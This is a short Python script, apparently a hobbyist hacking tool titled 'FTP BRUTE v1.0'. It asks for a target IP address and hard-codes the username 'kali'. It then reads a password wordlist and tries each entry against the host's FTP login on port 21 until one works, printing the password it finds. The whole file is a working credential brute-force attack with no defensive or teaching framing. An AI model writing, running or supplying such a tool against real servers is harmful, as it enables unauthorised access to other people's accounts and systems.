# Module
import ftplib
import time
import os

# Index
index = """
 _____   _____   _____        _____   _____    _   _   _____   _____  
|  ___| |_   _| |  _  \      |  _  \ |  _  \  | | | | |_   _| | ____| 
| |__     | |   | |_| |      | |_| | | |_| |  | | | |   | |   | |__   
|  __|    | |   |  ___/      |  _  { |  _  /  | | | |   | |   |  __|  
| |       | |   | |          | |_| | | | \ \  | |_| |   | |   | |___  
|_|       |_|   |_|          |_____/ |_|  \_\ \_____/   |_|   |_____|  v1.0
"""
line = "========================================================================"
print(index)
print(line)


# User Input - Variables
host = input("Enter IP Address : ")
user = 'kali'
port = 21

# Function
def is_correct(password):
    server = ftplib.FTP()
    print(f"[!] Trying", password)
    
    try:
        server.connect(host,port,timeout=5)
        server.login(user,password)
        
    except ftplib.error_perm:
        return False
    
    else:
        print(f"[+] Password Found :",password)
        return True
    
    
passwords = open("wordlists.txt").read().split("\n")
print("[+] Password To Try : ",len(passwords))

try:
    for password in passwords:
        if is_correct(password):
            break
        
except ConnectionRefusedError:
    print("The FTP Is Closed Please Try Again..!")
    time.sleep(2)
    exit()